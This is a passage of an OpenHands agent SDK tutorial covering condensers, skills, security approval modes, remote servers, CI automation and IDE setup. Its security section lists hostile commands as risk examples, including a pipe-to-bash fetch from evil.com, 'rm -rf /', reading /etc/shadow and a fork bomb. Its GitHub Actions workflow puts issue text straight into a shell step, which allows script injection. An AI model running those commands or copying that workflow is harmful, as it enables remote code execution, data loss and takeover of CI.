            tool_call_id=action.tool_call_id if hasattr(action, 'tool_call_id') else None,
        )

# ─── Step 3: Register the tool with an agent ───
# The agent needs the tool wrapped in Tool() to include it in its action space
weather_tool = Tool(
    name=WeatherCheckerTool.name,
    tool_class=WeatherCheckerTool,
)

print('Custom tool created: WeatherChecker')
print(f'  Name: {weather_tool.name}')
print(f'  Action: WeatherCheckAction(city, units)')
print(f'  The LLM will see this tool and can invoke it when the user asks about weather')

```

## 5.9 Tool Selection Decision Guide

| Task | Use This Tool |
|---|---|
| Read/write/edit source code | `FileEditorTool` |
| Run tests, install deps, git commands | `TerminalTool` |
| Break down complex task into steps | `TaskTrackerTool` |
| Look up documentation, APIs, error messages | `WebBrowserTool` |
| Access GitHub, databases, external services | `MCPTool` + MCP servers |
| Domain-specific operations (weather, Slack, CRM) | Custom Tool (extend BaseTool) |


## Next

→ [go to Section 06](#06-) — Context management, condensers, and the skills system


# 06 — Context Management & Skills

**Goal:** Master how OpenHands manages conversation context across long tasks and how skills provide reusable procedural knowledge.

**What You'll Learn:**
- Context condensation: how history gets compressed to fit token limits
- The condenser pipeline: summarizers, truncators, and LLM condensers
- Skills: reusable prompt templates triggered by conditions
- AGENTS.md and context files: injecting project-specific knowledge
- Best practices for long-running agent tasks


## 6.1 The Context Problem

Every tool call adds events to the conversation history. After 50+ turns, the history can exceed the LLM's context window. OpenHands solves this with **condensers** — components that compress old events while preserving essential information.

```
Event History (growing) → Condenser → Compressed History → LLM
                              ↑
                        Drops repetitive output
                        Summarizes old turns
                        Preserves key decisions
```

**Without condensers:** Agent forgets early context, repeats actions, misses constraints.
**With condensers:** Agent maintains coherent behavior even after hundreds of tool calls.


## 6.2 Condenser Types

| Condenser | Strategy | Best For |
|---|---|---|
| **NoOpCondenser** | Keep everything (no compression) | Short tasks, debugging |
| **LLMCondenser** | Use a smaller/cheaper LLM to summarize old events | Production, long tasks |
| **TruncationCondenser** | Drop oldest events, keep recent ones | Memory-constrained |
| **HybridCondenser** | Summarize middle, keep start and end | Balanced approach |

The default condenser is auto-selected based on the model's context window and task complexity.


```python
# ═══════════════════════════════════════════
# 6.2 Configuring a Condenser
# ═══════════════════════════════════════════
# Condensers are configured per-conversation — different tasks need different strategies

from openhands.sdk.condenser import LLMCondenser

# ─── LLM-based condensation ───
# Uses a cheap model (like GPT-5.4 mini) to summarize old events
# The summarizer LLM is DIFFERENT from the agent's main LLM
# This keeps summary costs low while preserving decision quality
condenser = LLMCondenser(
    llm=LLM(  # A separate, cheaper LLM just for summarization
        model='gpt-5.4-mini',  # Smaller model = lower cost
        api_key=os.getenv('LLM_API_KEY'),
    ),
    keep_recent=20,  # Always keep the last 20 events verbatim
    target_tokens=80000,  # Aim to keep total context under 80K tokens
)

print('Condenser configured:')
print(f'  Type: LLM-based summarization')
print(f'  Summarizer model: gpt-5.4-mini (cheaper than main model)')
print(f'  Keep recent: 20 events (verbatim — never compressed)')
print(f'  Target: 80K tokens total context budget')

# ─── Apply condenser to a conversation ───
# The condenser runs automatically before each LLM call
# You don't need to invoke it manually — it's part of the agent loop
print(f'\nTo use: Conversation(agent=agent, workspace=..., condenser=condenser)')

```

## 6.3 The Skills System

Skills are **reusable prompt fragments** that activate on trigger conditions. Think of them as "if the user asks about X, inject these instructions."

**Skill anatomy:**
```yaml
# SKILL.md
---
name: python-testing
description: Generate pytest tests following project conventions
triggers:
  - keywords: [test, pytest, unit test, coverage]
  - file_patterns: ['test_*.py', '*_test.py']
---

When writing tests:
1. Use pytest (never unittest)
2. Follow AAA pattern: Arrange, Act, Assert
3. Use fixtures from conftest.py
4. Mock external services with pytest-mock
```

When the user mentions "test" or edits a `test_*.py` file, these instructions are injected into the agent's context automatically.


```python
# ═══════════════════════════════════════════
# 6.3 Creating and Loading Skills
# ═══════════════════════════════════════════
from pathlib import Path
import yaml

# ─── Skill structure (in-memory for demo) ───
# Skills are stored as SKILL.md files with YAML frontmatter
# The frontmatter defines triggers; the body is the injected prompt
skill_yaml = """---
name: security-review
description: Security review checklist for code changes
triggers:
  - keywords: [security, vulnerability, auth, encryption, SQL injection, XSS]
  - file_patterns: ['*.env', '*.pem', 'auth*.py', '*password*']
version: 1.0.0
---

# Security Review Skill

When reviewing or writing code, ALWAYS check:

1. **Input Validation:** All user input is validated and sanitized
2. **Authentication:** Secrets are never hardcoded, use environment variables
3. **SQL Injection:** Use parameterized queries (never string formatting)
4. **XSS:** Escape output in HTML contexts
5. **CSRF:** State-changing endpoints require CSRF tokens
6. **Dependencies:** Check for known vulnerabilities (run `pip-audit` or `npm audit`)

Report findings with severity: CRITICAL, HIGH, MEDIUM, LOW.
"""

# Parse the frontmatter to see skill metadata
# The YAML between --- markers is structured metadata
parts = skill_yaml.split('---')
if len(parts) >= 3:
    metadata = yaml.safe_load(parts[1])
    body = parts[2].strip()
    print('Skill Metadata:')
    for key, value in metadata.items():
        print(f'  {key}: {value}')
    print(f'\nSkill Body (injected into agent context when triggered):')
    print(f'  Length: {len(body)} chars')
    print(f'  Preview: {body[:120]}...')
    print(f'\nWhen agent sees "security" keyword or edits auth*.py,')
    print(f'the full security review checklist is injected into its context.')

```

## 6.4 AGENTS.md and Context Files

OpenHands respects project-level context files that tell the agent about your codebase:

| File | Purpose |
|---|---|
| `AGENTS.md` | Project-wide instructions for AI agents |
| `CLAUDE.md` | Claude-specific instructions (also read by OpenHands) |
| `.cursorrules` | Cursor editor rules (also read by OpenHands) |
| `README.md` | Project overview — injected as context |

**Example AGENTS.md:**
```markdown
# Agent Instructions

- This project uses pytest with fixtures in conftest.py
- Always run `pre-commit run --all-files` before committing
- Database migrations go through Alembic: `alembic upgrade head`
- API keys are stored in `.env` — NEVER commit `.env` files
- Code style: Black with line length 100
- Test coverage must stay above 85%
```

OpenHands reads these files automatically when the workspace is a project directory.


## 6.5 Best Practices for Long-Running Agents

1. **Use skills for project conventions** — one skill for testing patterns, one for deployment, one for code style
2. **Keep AGENTS.md up to date** — the agent is only as good as its context
3. **Set reasonable condenser targets** — 80K tokens is a good default for 128K+ context models
4. **Break large tasks into sub-tasks** — let the TaskTrackerTool manage decomposition
5. **Monitor token usage** — the condenser should keep you under the model's limit, but verify


## Next

→ [go to Section 07](#07-) — Security analyzer, risk levels, and approval modes


# 07 — Security Analyzer & Approval Modes

**Goal:** Understand how OpenHands keeps agents safe and how to control what agents can do without human approval.

**What You'll Learn:**
- The Security Analyzer: how it evaluates risks before execution
- Risk levels: LOW, MEDIUM, HIGH — and what happens at each
- Approval modes: always-approve, llm-approve, human-in-the-loop
- Sandboxing: Docker isolation, network restrictions, filesystem scoping
- Action confirmation policies
- Best practices for production safety


## 7.1 Why Security Matters for Coding Agents

An autonomous coding agent with shell access is powerful — and dangerous without guardrails. It can:
- `rm -rf /` — delete everything (mitigated by sandbox)
- `curl ... | bash` — execute arbitrary code from the internet
- `git push --force` — overwrite remote history
- Modify `.env` and leak secrets in logs
- Install malicious packages via pip/npm

OpenHands addresses this with a **layered security model**:
1. **Security Analyzer** — evaluate every action BEFORE execution
2. **Approval Modes** — require human or LLM sign-off for risky actions
3. **Sandboxing** — isolate execution in Docker containers
4. **Filesystem Scoping** — limit which directories the agent can access


## 7.2 The Security Analyzer

Before ANY action executes, the Security Analyzer evaluates its risk:

```
Agent proposes Action → Security Analyzer → LOW: execute immediately
                                        → MEDIUM: log warning, execute
                                        → HIGH: block, request approval
```

**What the analyzer checks:**
- Command injection patterns (`; rm`, `$(...)`, backticks)
- Destructive operations (`rm -rf`, `chmod 777`, `:(){ :|:& };:`)
- Network exfiltration (`curl ... | bash`, data sent to unknown hosts)
- Filesystem escape (`/etc/passwd`, `~/.ssh`, outside workspace)
- Privilege escalation (`sudo`, `su`, `chown root`)


```python
# ═══════════════════════════════════════════
# 7.2 Security Analyzer — Risk Categories
# ═══════════════════════════════════════════
# This shows the conceptual model — the real analyzer runs inside the agent loop

risk_examples = {
    'LOW': [
        'echo "Hello World"',
        'python --version',
        'ls -la',
        'cat README.md',
        'pip list --outdated',
    ],
    'MEDIUM': [
        'npm install react',          # Installs packages
        'git push origin feature/x',  # Pushes to remote
        'curl -O https://example.com/file.tar.gz',  # Downloads
        'docker build -t myapp .',    # Builds container
    ],
    'HIGH': [
        'rm -rf /',                   # Destructive
        'sudo systemctl restart nginx',  # Privilege escalation
        'curl evil.com/script.sh | bash', # Remote code execution
        'git push --force origin main',  # Force push
        'cat /etc/shadow',            # System file access
    ],
}

for level, examples in risk_examples.items():
    print(f'\n{"="*60}')
    print(f'{level} RISK — {"Auto-approved" if level == "LOW" else "Needs check" if level == "MEDIUM" else "BLOCKED without approval"}')
    print(f'{"="*60}')
    for cmd in examples:
        print(f'  $ {cmd}')

```

## 7.3 Approval Modes

OpenHands has three approval modes that control how risky actions are handled:

| Mode | CLI Flag | Behavior |
|---|---|---|
| **Human-in-the-loop** | (default) | Show action to user, wait for confirm/deny |
| **LLM-approve** | `--llm-approve` | Use a separate LLM to judge action safety |
| **Always-approve** | `--always-approve` | Execute everything without confirmation |

**When to use each:**
- **Human-in-the-loop:** Interactive development — you want to review before execution
- **LLM-approve:** Trusted tasks where human review is impractical (CI, batch jobs)
- **Always-approve:** Fully automated pipelines with sandboxed, scoped access (headless mode enforces this)


```python
# ═══════════════════════════════════════════
# 7.3 Approval Mode Configuration
# ═══════════════════════════════════════════
# In the SDK, you configure approval via the Conversation or Agent settings

print('Approval Mode Configuration (CLI):')
print('─' * 50)
print()
print('# Default — human confirms each action in TUI')
print('openhands')
print()
print('# LLM-based approval — cheaper model judges safety')
print('openhands --llm-approve')
print()
print('# Auto-approve — for fully automated workflows')
print('openhands --always-approve')
print()
print('# Headless mode ALWAYS auto-approves (no override)')
print('openhands --headless -t "Add unit tests"')
print()
print('─' * 50)
print()
print('Approval Mode Configuration (SDK):')
print('─' * 50)
print()
print('from openhands.sdk.security import SecurityAnalyzer, ApprovalMode')
print()
print('# Default: human-in-the-loop')
print('analyzer = SecurityAnalyzer(mode=ApprovalMode.HUMAN_LOOP)')
print()
print('# LLM-based approval')
print('analyzer = SecurityAnalyzer(')
print('    mode=ApprovalMode.LLM_APPROVE,')
print('    llm=LLM(model="gpt-5.4-mini"),  # Separate LLM for security')  
print(')')
print()
print('# Auto-approve (use with sandbox!)')
print('analyzer = SecurityAnalyzer(mode=ApprovalMode.ALWAYS_APPROVE)')

```

## 7.4 Docker Sandboxing

The strongest security layer: run the agent inside an isolated Docker container.

**What sandboxing provides:**
- **Filesystem isolation:** Agent can't access host files unless explicitly mounted
- **Network control:** Agent network access can be restricted or disabled
- **Resource limits:** CPU, memory, and disk quotas
- **Ephemeral:** Container is destroyed after task — no persistent malware
- **Reproducible:** Same environment every time

```bash
# CLI: Agent runs in Docker sandbox automatically with 'openhands serve'
openhands serve --mount-cwd  # Mount ONLY current directory

# SDK: Remote Agent Server provides Docker sandboxes
from openhands.workspace import RemoteWorkspace
ws = RemoteWorkspace(base_url='http://agent-server:8000')
```


## 7.5 Filesystem Scoping

Limit which directories the agent can access — even in local mode:

```bash
# Mount only the current directory (not your home dir, not /etc)
openhands serve --mount-cwd

# In headless mode, the workspace is the working directory
cd /path/to/project && openhands --headless -t "Refactor utils.py"
```

The agent's `workspace_path` is the root of its filesystem view — it cannot `cd ..` out of it in sandboxed mode.


## 7.6 Security Best Practices

1. **Always use Docker sandboxing** for untrusted code or internet-facing agents
2. **Never run `--always-approve` without sandboxing** on a machine you care about
3. **Scope workspace to project directory** — not your home directory
4. **Use read-only mounts** for reference data that shouldn't be modified
5. **Review the event log** after automated runs — check for suspicious commands
6. **Rotate API keys** used by agents regularly
7. **Set resource limits** (CPU/memory) on Docker containers to prevent DoS
8. **Use separate API keys** for agents vs personal use — easier to revoke


## Next

→ [go to Section 08](#08-) — Running agents remotely via the Agent Server


# 08 — Agent Server: Remote Execution

**Goal:** Deploy and use the Agent Server for remote, sandboxed, and production-grade agent execution.

**What You'll Learn:**
- Agent Server architecture: REST + WebSocket
- Starting the server locally and with Docker
- Connecting via RemoteWorkspace
- WebSocket for streaming events
- OpenAI-compatible endpoint for chat UIs
- Multi-agent deployment patterns


## 8.1 Why a Remote Agent Server?

Running agents locally works for development, but production needs:
- **Isolation:** Agents run in Docker containers, not on your laptop
- **Scalability:** Multiple agents can run concurrently on different machines
- **Persistence:** Server manages agent state, clients connect/disconnect freely
- **Security:** Centralized sandboxing, API key management, audit logging
- **OpenAI compatibility:** Chat UIs, IDEs, voice platforms can use OpenHands as a drop-in model


## 8.2 Server Architecture

```
┌──────────────────────────────────────────────┐
│              Agent Server                     │
├──────────────────────────────────────────────┤
│  REST API          WebSocket       OpenAI     │
│  POST /conversations  ws://.../ws   /v1/chat  │
│  GET  /conversations               /v1/models │
│  POST /messages                               │
├──────────────────────────────────────────────┤
│         Agent Runtime (Docker)                │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐      │
│  │ Agent 1 │  │ Agent 2 │  │ Agent 3 │ ...  │
│  │(sandbox)│  │(sandbox)│  │(sandbox)│      │
│  └─────────┘  └─────────┘  └─────────┘      │
└──────────────────────────────────────────────┘
```


```bash
# ─── Option 1: Start server locally (development) ───
# This runs the agent server on your machine — good for testing
openhands agent-server
# Server starts at http://localhost:8000
# REST API: http://localhost:8000/api
# WebSocket: ws://localhost:8000/ws
# OpenAI endpoint: http://localhost:8000/v1

# ─── Option 2: Start server with Docker (production) ───
# The server itself runs in Docker, and agents run in sibling containers
docker run -d --name openhands-server \
  -p 8000:8000 \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -e AGENT_SERVER_IMAGE_REPOSITORY=ghcr.io/openhands/agent-server \
  -e AGENT_SERVER_IMAGE_TAG=1.26.0-python \
  ghcr.io/openhands/agent-server:latest

# ─── Option 3: Using docker-compose ───
# Better for multi-service setups (server + database + monitoring)

# Verify server is running:
curl http://localhost:8000/api/alive
# Should return: {"status": "ok"}
```

## 8.3 Connecting via Python SDK

Once the server is running, connect to it with `RemoteWorkspace`:


```bash
from openhands.sdk import LLM, Agent, Conversation
from openhands.workspace import RemoteWorkspace
from openhands.tools import Tool
from openhands.tools.file_editor import FileEditorTool
from openhands.tools.terminal import TerminalTool

# ─── Step 1: LLM (same as local) ───
llm = LLM(model="gpt-5.5", api_key=os.getenv("LLM_API_KEY"))

# ─── Step 2: Remote workspace instead of LocalWorkspace ───
# This is the ONLY change vs local mode — everything else is identical
workspace = RemoteWorkspace(
    base_url="http://localhost:8000",  # Agent Server URL
    api_key=os.getenv("AGENT_SERVER_KEY"),  # Server auth token
)

# ─── Step 3: Agent and Conversation (identical to local) ───
agent = Agent(
    llm=llm,
    tools=[
        Tool(name=FileEditorTool.name),
        Tool(name=TerminalTool.name),
    ],
)

conv = Conversation(agent=agent, workspace=workspace)
conv.send_message("Create a FastAPI app with Dockerfile")
conv.run()  # Executes REMOTELY in Docker sandbox on the server
```

## 8.4 WebSocket for Streaming Events

For real-time applications, use WebSocket to stream agent events as they happen:

```python
import asyncio
import websockets
import json

async def stream_agent_events(conversation_id: str):
    uri = f"ws://localhost:8000/ws/conversations/{conversation_id}"
    async with websockets.connect(uri) as ws:
        async for message in ws:
            event = json.loads(message)
            print(f"[{event['type']}] {event.get('content', '')}")
            if event['type'] == 'finish':
                break

# Run with:
# asyncio.run(stream_agent_events('conv_abc123'))
```


## 8.5 OpenAI-Compatible Endpoint

The Agent Server exposes an OpenAI-compatible API at `/v1`:

```bash
# List models — OpenHands agent appears as a model
curl http://localhost:8000/v1/models
# Returns: {"data": [{"id": "openhands-agent", ...}]}

# Chat completion — any OpenAI client can talk to OpenHands
curl http://localhost:8000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "openhands-agent",
    "messages": [{"role": "user", "content": "Create a TODO app in React"}]
  }'
```

This means ANY tool that works with OpenAI's API (chat UIs, voice assistants, IDE plugins) can use OpenHands as a drop-in replacement.


## 8.6 Production Deployment Patterns

| Pattern | Setup | Use Case |
|---|---|---|
| **Single server** | One Agent Server, multiple clients | Team sharing an agent |
| **Server per project** | One Agent Server per codebase | Isolation between projects |
| **Kubernetes** | Agent Server as a Deployment, agents as Jobs | Enterprise scale |
| **Serverless** | OpenHands Cloud | Zero-ops, pay-per-use |


## Next

→ [go to Section 09](#09-) — Automating CI/CD pipelines with headless mode


# 09 — Headless Automation: CI/CD & Scripting

**Goal:** Automate software engineering tasks with OpenHands in CI/CD pipelines, scripts, and batch workflows.

**What You'll Learn:**
- Headless mode deep dive: always-approve, JSONL output, exit codes
- GitHub Actions integration patterns
- Parsing JSONL output for downstream processing
- Building a CI pipeline that auto-fixes lint errors
- Batch processing multiple repositories
- Error handling and retry strategies


## 9.1 Headless Mode Recap

Headless mode is the automation workhorse:

```bash
openhands --headless -t "Your task"           # Basic
openhands --headless -f task.txt              # From file
openhands --headless --json -t "Task"         # JSONL output
openhands --headless --override-with-envs -t "Task"  # Use env vars
```

**Critical:** Headless mode ALWAYS auto-approves actions. There is no human-in-the-loop. Run in sandboxed environments.


## 9.2 Exit Codes

OpenHands uses standard exit codes for pipeline integration:

| Code | Meaning | Pipeline Action |
|---|---|---|
| `0` | Task completed successfully | Continue pipeline |
| `1` | Task failed or agent errored | Fail the step |
| `2` | Invalid arguments | Fix configuration |


```bash
# ─── Pattern 1: Simple pass/fail ───
openhands --headless -t "Fix all ESLint errors"
if [ $? -eq 0 ]; then
    echo "✓ Lint fixes applied successfully"
else
    echo "✗ Agent failed — check logs"
    exit 1
fi

# ─── Pattern 2: Conditional on exit code ───
openhands --headless -t "Update dependencies"
case $? in
    0) echo "Dependencies updated" ;;
    1) echo "Update failed — creating issue"
       gh issue create --title "Auto-dependency update failed" \
           --body "OpenHands could not complete the update. Check CI logs."
       ;;
    2) echo "Invalid config — check openhands setup" ;;
esac

# ─── Pattern 3: Retry on failure ───
# Some tasks benefit from a retry with a more specific prompt
for attempt in 1 2 3; do
    echo "Attempt $attempt..."
    if openhands --headless -t "Fix all type errors reported by mypy"; then
        echo "✓ Success on attempt $attempt"
        break
    fi
    echo "Attempt $attempt failed, retrying with more context..."
    sleep 10
done
```

## 9.3 JSONL Output — Structured Event Streaming

The `--json` flag streams each event as a JSON line. This is the bridge between OpenHands and other tools.

```json
{"type": "action", "action": "write", "path": "app.py", "content": "..."}
{"type": "observation", "content": "File created successfully"}
{"type": "action", "action": "run", "command": "python app.py"}
{"type": "observation", "content": "Hello World"}
{"type": "finish", "message": "Task completed"}
```


```bash
{"type": "message", "role": "user", "content": "Create hello.py"}
{"type": "action", "action": "write", "path": "hello.py"}
{"type": "observation", "content": "File written: hello.py"}
{"type": "action", "action": "run", "command": "python hello.py"}
{"type": "observation", "content": "Hello, World!"}
{"type": "finish", "message": "Task completed successfully"}
```

## 9.4 GitHub Actions Integration

A complete GitHub Actions workflow that uses OpenHands:


```yaml
name: OpenHands Auto-Fix

on:
  issues:
    types: [labeled]
  workflow_dispatch:
    inputs:
      task:
        description: 'Task for OpenHands'
        required: true

jobs:
  autofix:
    # Only run when the "openhands" label is applied
    if: github.event.label.name == 'openhands'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install uv and OpenHands
        run: |
          curl -LsSf https://astral.sh/uv/install.sh | sh
          uv tool install openhands --python 3.12

      - name: Run OpenHands
        env:
          LLM_API_KEY: ${{ secrets.LLM_API_KEY }}
          LLM_MODEL: ${{ vars.LLM_MODEL || 'claude-sonnet-4-5' }}
        run: |
          ISSUE_TITLE="${{ github.event.issue.title }}"
          ISSUE_BODY="${{ github.event.issue.body }}"
          openhands --headless --override-with-envs --json \
            -t "GitHub Issue: $ISSUE_TITLE. Details: $ISSUE_BODY" \
            > openhands_output.jsonl

      - name: Create PR with changes
        if: success()
        run: |
          git config user.name "OpenHands Bot"
          git config user.email "bot@openhands.dev"
          git checkout -b openhands/fix-${{ github.event.issue.number }}
          git add -A
          git diff --staged --quiet || (
            git commit -m "Fix: ${{ github.event.issue.title }}

            Closes #${{ github.event.issue.number }}"
            git push origin openhands/fix-${{ github.event.issue.number }}
            gh pr create \
              --title "Auto-fix: ${{ github.event.issue.title }}" \
              --body "Automated fix by OpenHands. Closes #${{ github.event.issue.number }}"
          )
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

## 9.5 Batch Processing Multiple Repositories

Use headless mode to apply the same task across many repos:


```bash
#!/bin/bash
# Batch process: add CODEOWNERS to all repos in an org

REPOS=(
    "org/repo-alpha"
    "org/repo-beta"
    "org/repo-gamma"
    "org/repo-delta"
)

TASK="Create a CODEOWNERS file that assigns reviews to the maintainers team"

for repo in "${REPOS[@]}"; do
    echo "=== Processing $repo ==="

    # Clone the repo
    gh repo clone "$repo" "/tmp/batch-$repo"
    cd "/tmp/batch-$repo" || exit 1

    # Run OpenHands
    if openhands --headless --override-with-envs -t "$TASK"; then
        # Commit and create PR if changes were made
        if ! git diff --quiet; then
            git checkout -b openhands/add-codeowners
            git add CODEOWNERS
            git commit -m "Add CODEOWNERS file"
            git push origin openhands/add-codeowners
            gh pr create --title "Add CODEOWNERS" \
                --body "Automated by OpenHands batch processor"
            echo "  -> PR created for $repo"
        else
            echo "  -> No changes needed for $repo"
        fi
    else
        echo "  -> FAILED for $repo — check logs"
    fi

    cd -
done

echo "Batch processing complete"
```

## 9.6 CI/CD Best Practices

1. **Use `--override-with-envs`** with CI secrets — never hardcode keys
2. **Capture JSONL output** for debugging failed runs
3. **Set timeout** on CI steps — agents can loop (GitHub Actions: `timeout-minutes: 30`)
4. **Use a cheaper model for simple tasks** — `gpt-5.4-mini` for lint fixes, `claude-sonnet` for complex refactors
5. **Test headless tasks locally first** — `openhands --headless -t "..."` before pushing to CI
6. **Always create a branch/PR**, never push directly to main
7. **Review diffs before merging** — the agent is fast but not infallible


## Next

→ [go to Section 10](#10-) — Using OpenHands inside JetBrains, VS Code, Zed, and Toad


# 10 — IDE Integration via ACP

**Goal:** Set up OpenHands as an AI agent inside your IDE using the Agent Client Protocol.

**What You'll Learn:**
- The ACP protocol: JSON-RPC 2.0 over stdio
- JetBrains IDEs: IntelliJ, PyCharm, WebStorm setup
- VS Code integration via community extension
- Zed editor native ACP support
- Toad editor universal terminal interface
- Multiple agent configurations for different workflows


## 10.1 How ACP Works

The Agent Client Protocol (ACP) lets IDEs communicate with AI agents through a standard interface:

```
┌──────────┐  JSON-RPC 2.0  ┌────────────────┐  API Calls  ┌──────────┐
│ Your IDE │←──────────────→│ OpenHands CLI  │───────────→│ LLM      │
│          │   over stdio   │ (openhands acp)│            │ Provider │
└──────────┘                └────────────────┘            └──────────┘
```

The IDE launches `openhands acp` as a subprocess. All communication happens over stdin/stdout using JSON-RPC 2.0 messages.


## 10.2 Prerequisites for All IDEs

1. OpenHands CLI installed (`uv tool install openhands --python 3.12`)
2. LLM configured (`openhands` → `/settings`)
3. IDE with ACP support (see table below)


## 10.3 JetBrains IDEs (IntelliJ, PyCharm, WebStorm…)

JetBrains IDEs version 25.3+ support ACP natively via JetBrains AI Assistant.

**Setup:**

1. Create `~/.jetbrains/acp.json` (Linux/macOS) or `C:\Users\<user>\.jetbrains\acp.json` (Windows)
2. Add the configuration:

```json
{
  "agent_servers": {
    "OpenHands": {
      "command": "openhands",
      "args": ["acp"],
      "env": {}
    }
  }
}
```

**Advanced configurations:**


```python
# ═══════════════════════════════════════════
# 10.3 JetBrains ACP Configurations
# ═══════════════════════════════════════════
import json

# ─── Multiple agent configurations ───
# You can define multiple OpenHands profiles for different workflows
acp_config = {
    "agent_servers": {
        # Default: interactive, requires confirmation for risky actions
        "OpenHands": {
            "command": "openhands",
            "args": ["acp"],
            "env": {}
        },
        # Auto-approve: for trusted, repetitive tasks
        "OpenHands (Auto-Approve)": {
            "command": "openhands",
            "args": ["acp", "--always-approve"],
            "env": {}
        },
        # LLM-approve: second LLM screens actions for safety
        "OpenHands (LLM-Approve)": {
            "command": "openhands",
            "args": ["acp", "--llm-approve"],
            "env": {}
        },
        # Resume latest: continue where you left off
        "OpenHands (Resume Latest)": {
            "command": "openhands",
            "args": ["acp", "--resume", "--last"],
            "env": {}
        },
    }
}

print('JetBrains ACP Configuration (~/.jetbrains/acp.json):')
print(json.dumps(acp_config, indent=2))
print()
print('After creating this file, restart your JetBrains IDE.')
print('OpenHands will appear as an available agent in AI Assistant.')

```

## 10.4 VS Code

VS Code integration uses a community ACP extension:

```bash
# Install the ACP extension (search in VS Code marketplace)
# Then configure settings.json:
{
  "acp.agents": [
    {
      "id": "openhands",
      "name": "OpenHands",
      "command": "openhands",
      "args": ["acp"]
    }
  ]
}
```


## 10.5 Zed Editor

Zed has built-in ACP support — no extension needed:

```json
// ~/.config/zed/settings.json
{
  "agent_servers": {
    "OpenHands": {
      "command": "openhands",
      "args": ["acp"]
    }
  }
}
```


## 10.6 Toad Editor

Toad uses a universal terminal interface — OpenHands works through the terminal integration directly.


## 10.7 IDE Integration Best Practices

1. **Use LLM-approve mode** in IDEs — you're actively coding and want safety without constant popups
2. **Create separate configurations** — one for code review, one for refactoring, one for test generation
3. **Pin the workspace** to your project root — avoids confusion about which files are in scope
4. **Use resume** — IDE sessions benefit from continuity; `--resume --last` is your friend
5. **ACD is experimental** — report issues on the OpenHands-CLI GitHub repo


## Next

→ [go to Section 11](#11-) — Multi-agent orchestration and task decomposition


# 11 — Advanced: Multi-Agent Orchestration

**Goal:** Orchestrate multiple OpenHands agents to tackle large-scale tasks through decomposition and parallel execution.

**What You'll Learn:**
- Task decomposition: breaking large tasks into agent-sized chunks
- Parallel agent execution patterns
- The orchestrator-worker pattern
- Dependency-aware task scheduling
- Cross-vendor agent review (agent A writes, agent B reviews)
- Performance benchmarks: when multi-agent beats single-agent


## 11.1 Why Multi-Agent?

Single agents have limits:
- **Context window:** After ~100 tool calls, even condensed history strains the LLM
- **Focus:** One agent working on 10 files loses track of the big picture
- **Laziness:** LLMs sometimes refuse large tasks or skip steps
- **Compounding errors:** A small mistake early in a long chain cascades

Multi-agent orchestration addresses these by:
- **Dividing work** into independent, parallelizable chunks
- **Isolating contexts** — each agent sees only its slice of the problem
- **Cross-validation** — one agent reviews another's output
- **Human oversight** at checkpoints, not on every line


## 11.2 Task Decomposition Strategy

The key to successful orchestration is decomposition. Good tasks are:

| Property | Meaning | Example |
|---|---|---|
| **One-shottable** | Agent can complete in one focused session | "Add type hints to utils.py" ✓ |
| **Single-commit** | Changes fit in one git commit | "Migrate entire codebase to TypeScript" ✗ |
| **Parallelizable** | Doesn't depend on other agents' output | "Add docstrings to module A" (when B doesn't import A) |
| **Verifiable** | Human can judge correct/incorrect quickly | "Write tests for function X" — tests pass or they don't |


```python
# ═══════════════════════════════════════════
# 11.2 Task Decomposition Example
# ═══════════════════════════════════════════
# Breaking a large task into parallel agent assignments

import json

# ─── Original task (too big for one agent) ───
big_task = """Migrate the entire frontend from Redux to Zustand.
The codebase has 45 connected components across 12 modules."""

# ─── Decomposed into parallel subtasks ───
# Each subtask targets leaf nodes in the dependency tree
# (components that few other things import = lowest risk)
subtasks = [
    {
        "id": "zustand-01",
        "module": "components/ui/Button",
        "imported_by": [],  # Leaf node — nothing depends on it
        "task": "Convert Button component from Redux connect() to Zustand useStore()",
        "files": ["components/ui/Button.tsx", "components/ui/Button.test.tsx"],
    },
    {
        "id": "zustand-02",
        "module": "components/ui/Modal",
        "imported_by": [],  # Another leaf — safe to do in parallel
        "task": "Convert Modal component from Redux to Zustand",
        "files": ["components/ui/Modal.tsx", "components/ui/Modal.test.tsx"],
    },
    {
        "id": "zustand-03",
        "module": "components/ui/Tooltip",
        "imported_by": ["Button", "Modal"],  # Depends on 01 and 02 being done first
        "task": "Convert Tooltip, ensuring compatibility with updated Button and Modal",
        "files": ["components/ui/Tooltip.tsx"],
        "depends_on": ["zustand-01", "zustand-02"],  # Run AFTER these complete
    },
]

print(f'Original: {big_task[:80]}...')
print(f'\nDecomposed into {len(subtasks)} subtasks:')
print(f'{"─"*70}')
for st in subtasks:
    deps = st.get('depends_on', [])
    print(f'  [{st["id"]}] {st["module"]}')
    print(f'    Dependencies: {deps if deps else "none (leaf node)"}')
    print(f'    Files: {", ".join(st["files"])}')
    print()
print(f'{"─"*70}')
print(f'Phase 1 (parallel): zustand-01, zustand-02  — 2 agents simultaneously')
print(f'Phase 2 (sequential): zustand-03  — waits for Phase 1 to complete')

```

## 11.3 Orchestrator-Worker Pattern

The production pattern for multi-agent OpenHands:

```
┌──────────────────┐
│   Orchestrator   │  ← Human or meta-agent
│   (Decomposes)   │
└────────┬─────────┘
         │ Spawns
    ┌────┴────┬─────────┬─────────┐
    ▼         ▼         ▼         ▼
┌───────┐ ┌───────┐ ┌───────┐ ┌───────┐
│Agent 1│ │Agent 2│ │Agent 3│ │Agent 4│
│Worker │ │Worker │ │Worker │ │Review │
└───────┘ └───────┘ └───────┘ └───────┘
    │         │         │         │
    └─────────┴────┬────┴─────────┘
                   ▼
            ┌──────────────┐
            │  Integrator  │  ← Merges results, resolves conflicts
            └──────────────┘
```


```bash
import asyncio
from concurrent.futures import ThreadPoolExecutor

async def run_agent_task(task: dict, workspace_path: str):
```

## 11.4 Cross-Vendor Agent Review

A powerful pattern: use different LLM providers for writing and reviewing:

```python
# Agent A (Writer): Claude — strong code generation
writer = Agent(
    llm=LLM(model="claude-sonnet-4-5", api_key=...),
    tools=[Tool(name=FileEditorTool.name)],
)

# Agent B (Reviewer): GPT — different perspective catches different issues
reviewer = Agent(
    llm=LLM(model="gpt-5.5", api_key=...),
    tools=[Tool(name=FileEditorTool.name)],  # Read-only in practice
    system_prompt="You are a code reviewer. Only write to REVIEW.md."
)

# Run writer → get diff → run reviewer on the diff
